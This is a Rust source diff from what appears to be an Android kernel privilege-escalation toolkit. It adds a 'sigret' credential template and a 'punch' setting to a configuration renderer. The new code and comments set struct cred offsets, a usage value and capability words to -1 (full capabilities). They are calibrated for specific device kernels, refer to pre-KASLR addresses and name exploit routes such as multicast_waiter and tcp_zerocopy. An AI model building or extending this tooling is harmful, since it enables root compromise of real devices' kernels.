@@ -175,6 +175,27 @@ pub fn conf_cred_6x() -> Vec<(String, String)> {
     .collect()
 }
 
+/// The sigret credential template. `fill_profile_cred_copy` zero-fills the
+/// whole copy and then writes only `usage` and the capability words, so a
+/// copy that runs past them would null out `security`/`user`/`user_ns` of the
+/// target credential. The calibrated sigret blobs therefore stop right after
+/// the capability run: PHY110 (6.1.141) is 80/0/256/48/3 and PLW110 (6.6.118)
+/// is 80/0/256/56/3, both without reference entries.
+pub fn conf_cred_sigret(caps_offset: u32) -> Vec<(String, String)> {
+    let copy_size = (caps_offset as u64 + 3 * 8).max(80);
+    [
+        ("caps_offset", caps_offset.to_string()),
+        ("copy_size", copy_size.to_string()),
+        ("usage_offset", "0".to_string()),
+        ("usage_value", "256".to_string()),
+        ("caps_count", "3".to_string()),
+        ("caps_value", "-1".to_string()),
+    ]
+    .into_iter()
+    .map(|(key, value)| (key.to_string(), value))
+    .collect()
+}
+
 /// The 5.x credential template from the derived `init_cred` values, in the
 /// bundled profile order. Reference images are pre-KASLR kernel VAs rendered
 /// as signed decimals (the profile's spelling).
@@ -291,6 +312,8 @@ pub struct ConfInputs<'a> {
     pub symbols: &'a BTreeMap<String, Option<u64>>,
     pub structs: &'a BTreeMap<String, Option<u32>>,
     pub route: Option<&'a str>,
+    /// Copy primitive ("sigret") when it differs from the route default.
+    pub punch: Option<&'a str>,
     pub route_geometry: &'a [(&'static str, i64)],
     pub cred: &'a [(String, String)],
     pub extra_offsets: &'a ConfExtraOffsets,
@@ -313,6 +336,13 @@ pub fn render_conf(input: &ConfInputs<'_>) -> String {
         format!("kernel_major = {}", major.unwrap_or(0)),
         "recommend_shizuku = 0".to_string(),
     ];
+    /* The punch is what decides the credential shape: only a multicast punch
+     * overwrites the whole struct cred, so only it needs the four referenced
+     * pointers. Stating it keeps the Kotlin validator from demanding
+     * `cred.ref_count` on a sigret profile. */
+    if let Some(punch) = input.punch {
+        lines.push(format!("punch = \"{punch}\""));
+    }
     lines.push(match input.phys {
         // Decimal only: HOCON has no `0x` literal, and the Kotlin reader
         // (`getLongAt`) accepts a Number only, so a hex spelling would be
@@ -494,6 +524,7 @@ mod tests {
             symbols: &symbols,
             structs: &structs,
             route: Some("select_stack"),
+            punch: None,
             route_geometry: &geometry,
             cred: &conf_cred_6x(),
             extra_offsets: &no_extra_offsets(),
@@ -525,6 +556,7 @@ mod tests {
             symbols: &symbols,
             structs: &structs,
             route: Some("tcp_zerocopy"),
+            punch: None,
             route_geometry: &geometry,
             cred: &conf_cred_6x(),
             extra_offsets: &no_extra_offsets(),
@@ -561,6 +593,7 @@ mod tests {
             symbols: &symbols,
             structs: &structs,
             route: Some("multicast_waiter"),
+            punch: None,
             route_geometry: &geometry,
             cred: &conf_cred_5x(&cred, 176),
             extra_offsets: &ConfExtraOffsets {
@@ -691,6 +724,7 @@ mod tests {
             symbols: &symbols,
             structs: &structs,
             route: Some("multicast_waiter"),
+            punch: None,
             route_geometry: &[],
             cred: &[],
             extra_offsets: &ConfExtraOffsets {
@@ -712,6 +746,7 @@ mod tests {
             symbols: &symbols,
             structs: &structs,
             route: None,
+            punch: None,
             route_geometry: &[],
             cred: &[],
             extra_offsets: &no_extra_offsets(),
@@ -737,6 +772,7 @@ mod tests {
             symbols: &symbols,
             structs: &structs,
             route: Some("multicast_waiter"),
+            punch: None,
             route_geometry: &geometry,
             cred: &[],
             extra_offsets: &no_extra_offsets(),
@@ -898,6 +934,7 @@ mod tests {
             symbols: &symbols,
             structs: &structs,
             route: Some("multicast_waiter"),
+            punch: None,
             route_geometry: &geometry,
             cred: &cred,
             extra_offsets: &extra,
